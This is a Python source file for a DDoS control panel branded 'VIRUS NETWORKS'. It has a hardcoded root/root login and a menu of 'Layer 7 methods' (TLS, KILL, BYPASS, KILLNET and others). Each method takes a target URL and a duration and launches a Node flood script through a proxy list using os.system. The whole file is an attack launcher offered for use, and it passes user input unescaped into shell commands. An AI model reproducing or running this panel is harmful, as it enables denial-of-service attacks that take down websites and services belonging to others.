111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111# -*- coding: utf-8 -*-
from operator import index
import subprocess
import httpx
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = "@NIXON_C2"

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (163, 16, 124)
end_color = (163, 16, 124)

class Color:
    colorama.init()

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""

 ██▒   █▓ ██▓ ██▀███   █    ██   ██████     ███▄    █ ▓█████▄▄▄█████▓ █     █░ ▒█████   ██▀███   ██ ▄█▀  ██████    
▓██░   █▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒     ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒▓█░ █ ░█░▒██▒  ██▒▓██ ▒ ██▒ ██▄█▒ ▒██    ▒    
 ▓██  █▒░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄      ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░▒█░ █ ░█ ▒██░  ██▒▓██ ░▄█ ▒▓███▄░ ░ ▓██▄      
  ▒██ █░░░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒   ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ ░█░ █ ░█ ▒██   ██░▒██▀▀█▄  ▓██ █▄   ▒   ██▒   
   ▒▀█░  ░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒   ▒██░   ▓██░░▒████▒ ▒██▒ ░ ░░██▒██▓ ░ ████▓▒░░██▓ ▒██▒▒██▒ █▄▒██████▒▒   
   ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░   ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   ░ ▓░▒ ▒  ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░▒ ▒▒ ▓▒▒ ▒▓▒ ▒ ░   
   ░ ░░   ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░   ░ ░░   ░ ▒░ ░ ░  ░   ░      ▒ ░ ░    ░ ▒ ▒░   ░▒ ░ ▒░░ ░▒ ▒░░ ░▒  ░ ░   
     ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░        ░   ░ ░    ░    ░        ░   ░  ░ ░ ░ ▒    ░░   ░ ░ ░░ ░ ░  ░  ░     
      ░   ░     ░        ░           ░              ░    ░  ░            ░        ░ ░     ░     ░  ░         ░     
     ░                                                                                                        
     
                       
                           RGB NETWORKS —— [ L7 METHODS ]
                          
                 | root@Basic |                          | root@Vip |         
                          
                   • TLS                                   • SKYNET                   
                   • RAPID                                 • BYPASS                                
                   • KILL                                  • VIRUS
                   • CAPTCHA                               • KILLNET
                   • XMIX                                                   
                                                     
                           
                                 
\033[0m""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿    
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ 
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠇⣔⣛⣒⣒⣒⣒⣚⣛⣷⡄⢯⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⢻⢰⣧⣴⣴⣤⣴⣦⣦⡦⢽⣧⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣕⣻⣿⣽⣿⣿⣿⣿⣿⣟⡆⢿⡶⠷⠶⠾⠾⢶⠷⣽⡏⠣⣹⣿⣿⣂⡟⣽⣏⣊⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿    
⣿⣿⣿⣿⣿⣿⣿⣿⢿⣷⣽⣿⣟⣯⣿⠻⣿⣽⣿⣿⣾⡄⠹⣛⣛⣛⣛⣛⣾⡿⠃⣴⣿⣿⠟⣝⣽⣟⣿⢿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿    
⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡿⣷⡿⠶⣿⣿⣿⣿⣿⣿⣮⣲⣿⡿⠟⣋⣤⣴⣾⣿⣿⣿⡶⢿⣿⡿⣿⣟⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿    ██▒   █▓ ██▓ ██▀███   █    ██   ██████    
⣿⣿⣿⣿⣿⣿⣿⣧⣼⡭⢭⣝⡿⣾⣷⣴⣿⣿⡿⣿⣿⡿⡿⢛⢍⣰⣶⡷⣾⣿⣿⣿⣿⡿⣷⣼⣿⡾⢿⣭⣭⣥⣧⣿⣻⣿⣿⣿⣿⣿   ▓██░   █▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒    
⣿⣿⣿⣿⣿⣿⣶⣶⠿⢿⣿⣿⣿⣷⡾⢿⢿⣿⣿⣿⠟⢛⡦⣾⣾⣿⣿⣿⣆⣉⢿⣿⣿⣿⣿⢧⣼⣷⣿⣿⣽⠿⣶⣶⣽⣿⣿⣿⣿⣿    ▓██  █▒░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄      
⣿⣿⣿⣿⣿⢷⣮⢿⣿⡻⣴⢟⠿⣿⣿⣟⣿⣿⣿⠕⣡⣼⣿⣿⣿⣿⣿⣿⣿⣷⣕⡾⣿⣿⣻⣿⣿⡿⢿⢶⡿⣻⣾⢥⣾⣿⣿⣿⣿⣿    ▒██ █░░░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒   
⣿⣿⣿⣿⣿⣿⣾⣶⡖⠔⣶⣿⣾⢿⣾⣽⣿⣿⠁⢰⡟⢿⣿⣾⣷⢷⣾⣿⣿⠻⣿⡌⡽⣿⣯⣿⣿⣿⣾⡷⠆⠔⡶⣶⣷⣿⣿⣿⣿⣿     ▒▀█░  ░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒   
⣿⣿⣿⣿⣟⠍⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠁⢸⡿⢿⠿⣿⣿⣾⡿⣿⠿⠿⣿⢻⡁⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⡩⣹⣿⣿⣿⣿     ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░   
⣿⣿⣿⣿⣿⢿⡿⣿⡟⠛⣽⣿⣻⣿⣿⣿⣿⣩⣆⢀⢯⣭⣭⣭⣍⣍⣩⣩⣒⣩⠇⠫⣷⣽⣿⣹⣿⣿⣿⣿⡟⡛⣽⡿⣿⢿⣿⣿⣿⣿     ░ ░░   ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░   
⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣯⣻⣧⡈⠳⣤⣤⣦⣶⣴⣤⡦⢛⣴⡬⢷⣿⣷⣿⣿⣿⣿⢿⣿⣿⣿⣿⣟⣻⣿⣿⣿⣿        ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░     
⣿⣿⣿⣿⣿⣯⣭⢽⡽⣿⡶⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣆⣬⡻⣿⡿⡟⣻⣴⣿⣿⣿⡿⣷⣶⣶⣿⣿⣿⢶⣿⣼⣷⢭⣏⣿⣿⣿⣿⣿          ░   ░     ░        ░           ░     
⣿⣿⣿⣿⣿⣿⣭⡭⠾⣿⣥⣭⣭⣽⣷⣶⣿⣿⣿⢿⣿⣿⡿⠟⢉⣄⣿⣿⣾⣿⣿⣿⣿⣿⣶⡶⣭⣭⣭⣥⣽⡿⡯⣭⣽⣿⣿⣿⣿⣿        ░                                     
⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣟⡯⢿⣮⣿⣿⣷⣿⣿⣿⣋⣧⣷⣿⣿⣿⣌⠛⢶⣿⡿⣿⣿⣿⣿⡿⢻⣻⣿⡿⢿⣷⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⢻⣿⣿⣿⣷⣿⣿⣋⣴⣿⣿⣿⣽⣹⣽⣿⣷⣇⡙⢿⣿⣷⣿⣿⣿⡟⣛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿          𝗖𝗿𝗲𝗮𝘁𝗼𝗿: @RGB_BOYS
⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⣷⣿⠿⠿⠿⠿⠿⢿⡿⠿⠿⠿⠿⠿⢿⡿⠿⠿⣿⡷⠾⠿⢿⣿⠿⠿⠿⠾⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿          𝗣𝗹𝗮𝗻 : 𝗩𝗶𝗽
⣿⣿⣿⣿⣿⣿⣿⣿⣆⢀⠹⣿⡟⢀⢠⣿⡆⢀⣾⡇⢀⣶⣶⣶⢀⢀⣿⡆⢀⣿⣿⠂⢀⣾⡇⢀⢰⣶⣶⣦⣄⣿⣿⣿⣿⣿⣿⣿⣿⣿          𝗣𝗿𝗼𝘅𝘆 : 𝟭𝟬𝟬𝟬𝗞
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⢀⠙⢀⢠⣿⣿⡇⢀⣿⡇⢀⠉⠉⠉⢀⣀⣿⡇⢀⣿⣿⢀⢀⣿⣧⣀⣀⣀⣀⢀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿          𝗧𝘆𝗽𝗲 : 𝗺𝗲𝗻𝘂
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢀⢀⣾⣿⣿⠃⢀⢿⠃⢀⢿⣷⡄⢀⠙⢿⣇⢀⠘⠛⢀⢀⣿⡈⠙⠛⠛⠛⢀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿          𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 : @𝗡𝗜𝗫𝗢𝗡_𝗖𝗬𝗕𝗘𝗥_𝗧𝗘𝗔𝗠
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡿⢿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⡿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣼⣿⣿⣧⣺⣿⣿⣿⣼⣿⣿⣿⣮⣤⣾⣿⣿⣯⣸⣿⣿⣧⣼⣿⣿⣷⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿                                                     
                                              
""")

	while True:
		sys.stdout.write(f"\x1b]2;[\] VIRUS-NETWORKS :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[31mroot@virus\x1b[1;31m\:~# \x1b[1;\033[31m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "Method" or sinput == "METHOD" or sinput == ".Method" or sinput == ".METHOD" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  

		elif sinput == "TLS" or sinput == "tls":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node TLS-SILIT {target} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "RAPID" or sinput == "rapid":
			try:
				target = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node RAPID {target} {time} 32 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
				
		elif sinput == "KILL" or sinput == "kill":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node improved-tls {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "CAPTCHA" or sinput == "captcha":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node tls-arz.js {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
			
		elif sinput == "SKYNET" or sinput == "skynet":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 &&  node gflood {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "BYPASS" or sinput == "bypass":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node BYPASS {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "VIRUS" or sinput == "virus":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node VIRUS {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "KILLNET" or sinput == "killnet":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node KILLNET {url} {time} 35 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "XMIX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node XMIX.js {url} {time} 64 15 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
     	

def login():
	sys.stdout.write(f"\x1b]2;[\] VIRUS-NETWORKS :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "root"
	passwd = "root"
	username = input("""\033[31m
	

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿    
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ 
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠇⣔⣛⣒⣒⣒⣒⣚⣛⣷⡄⢯⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⢻⢰⣧⣴⣴⣤⣴⣦⣦⡦⢽⣧⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿  
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣕⣻⣿⣽⣿⣿⣿⣿⣿⣟⡆⢿⡶⠷⠶⠾⠾⢶⠷⣽⡏⠣⣹⣿⣿⣂⡟⣽⣏⣊⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿    
⣿⣿⣿⣿⣿⣿⣿⣿⢿⣷⣽⣿⣟⣯⣿⠻⣿⣽⣿⣿⣾⡄⠹⣛⣛⣛⣛⣛⣾⡿⠃⣴⣿⣿⠟⣝⣽⣟⣿⢿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿    
⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡿⣷⡿⠶⣿⣿⣿⣿⣿⣿⣮⣲⣿⡿⠟⣋⣤⣴⣾⣿⣿⣿⡶⢿⣿⡿⣿⣟⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿    ██▒   █▓ ██▓ ██▀███   █    ██   ██████    
⣿⣿⣿⣿⣿⣿⣿⣧⣼⡭⢭⣝⡿⣾⣷⣴⣿⣿⡿⣿⣿⡿⡿⢛⢍⣰⣶⡷⣾⣿⣿⣿⣿⡿⣷⣼⣿⡾⢿⣭⣭⣥⣧⣿⣻⣿⣿⣿⣿⣿   ▓██░   █▒▓██▒▓██ ▒ ██▒ ██  ▓██▒▒██    ▒    
⣿⣿⣿⣿⣿⣿⣶⣶⠿⢿⣿⣿⣿⣷⡾⢿⢿⣿⣿⣿⠟⢛⡦⣾⣾⣿⣿⣿⣆⣉⢿⣿⣿⣿⣿⢧⣼⣷⣿⣿⣽⠿⣶⣶⣽⣿⣿⣿⣿⣿    ▓██  █▒░▒██▒▓██ ░▄█ ▒▓██  ▒██░░ ▓██▄      
⣿⣿⣿⣿⣿⢷⣮⢿⣿⡻⣴⢟⠿⣿⣿⣟⣿⣿⣿⠕⣡⣼⣿⣿⣿⣿⣿⣿⣿⣷⣕⡾⣿⣿⣻⣿⣿⡿⢿⢶⡿⣻⣾⢥⣾⣿⣿⣿⣿⣿    ▒██ █░░░██░▒██▀▀█▄  ▓▓█  ░██░  ▒   ██▒   
⣿⣿⣿⣿⣿⣿⣾⣶⡖⠔⣶⣿⣾⢿⣾⣽⣿⣿⠁⢰⡟⢿⣿⣾⣷⢷⣾⣿⣿⠻⣿⡌⡽⣿⣯⣿⣿⣿⣾⡷⠆⠔⡶⣶⣷⣿⣿⣿⣿⣿     ▒▀█░  ░██░░██▓ ▒██▒▒▒█████▓ ▒██████▒▒   
⣿⣿⣿⣿⣟⠍⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠁⢸⡿⢿⠿⣿⣿⣾⡿⣿⠿⠿⣿⢻⡁⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⡩⣹⣿⣿⣿⣿     ░ ▐░  ░▓  ░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░   
⣿⣿⣿⣿⣿⢿⡿⣿⡟⠛⣽⣿⣻⣿⣿⣿⣿⣩⣆⢀⢯⣭⣭⣭⣍⣍⣩⣩⣒⣩⠇⠫⣷⣽⣿⣹⣿⣿⣿⣿⡟⡛⣽⡿⣿⢿⣿⣿⣿⣿     ░ ░░   ▒ ░  ░▒ ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░   
⣿⣿⣿⣿⣿⣻⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣯⣻⣧⡈⠳⣤⣤⣦⣶⣴⣤⡦⢛⣴⡬⢷⣿⣷⣿⣿⣿⣿⢿⣿⣿⣿⣿⣟⣻⣿⣿⣿⣿        ░░   ▒ ░  ░░   ░  ░░░ ░ ░ ░  ░  ░     
⣿⣿⣿⣿⣿⣯⣭⢽⡽⣿⡶⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣆⣬⡻⣿⡿⡟⣻⣴⣿⣿⣿⡿⣷⣶⣶⣿⣿⣿⢶⣿⣼⣷⢭⣏⣿⣿⣿⣿⣿          ░   ░     ░        ░           ░     
⣿⣿⣿⣿⣿⣿⣭⡭⠾⣿⣥⣭⣭⣽⣷⣶⣿⣿⣿⢿⣿⣿⡿⠟⢉⣄⣿⣿⣾⣿⣿⣿⣿⣿⣶⡶⣭⣭⣭⣥⣽⡿⡯⣭⣽⣿⣿⣿⣿⣿        ░                                     
⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣟⡯⢿⣮⣿⣿⣷⣿⣿⣿⣋⣧⣷⣿⣿⣿⣌⠛⢶⣿⡿⣿⣿⣿⣿⡿⢻⣻⣿⡿⢿⣷⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⢻⣿⣿⣿⣷⣿⣿⣋⣴⣿⣿⣿⣽⣹⣽⣿⣷⣇⡙⢿⣿⣷⣿⣿⣿⡟⣛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⢿⣷⣿⠿⠿⠿⠿⠿⢿⡿⠿⠿⠿⠿⠿⢿⡿⠿⠿⣿⡷⠾⠿⢿⣿⠿⠿⠿⠾⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣆⢀⠹⣿⡟⢀⢠⣿⡆⢀⣾⡇⢀⣶⣶⣶⢀⢀⣿⡆⢀⣿⣿⠂⢀⣾⡇⢀⢰⣶⣶⣦⣄⣿⣿⣿⣿⣿⣿⣿⣿⣿           𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝗩𝗶𝗿𝘂𝘀 𝗡𝗲𝘁𝘄𝗼𝗿𝗸𝘀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⢀⠙⢀⢠⣿⣿⡇⢀⣿⡇⢀⠉⠉⠉⢀⣀⣿⡇⢀⣿⣿⢀⢀⣿⣧⣀⣀⣀⣀⢀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢀⢀⣾⣿⣿⠃⢀⢿⠃⢀⢿⣷⡄⢀⠙⢿⣇⢀⠘⠛⢀⢀⣿⡈⠙⠛⠛⠛⢀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡿⢿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⡿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣼⣿⣿⣧⣺⣿⣿⣿⣼⣿⣿⣿⣮⣤⣾⣿⣿⣯⣸⣿⣿⣧⣼⣿⣿⣷⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                              
 
                            		   
                        \033[[\033[31musername\033[]:\033[31m """)
	password = getpass.getpass(prompt='                        \033[[\033[31mpassword\033[]:\033[31m ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[31m                   ")
		time.sleep(1)
		main()

login()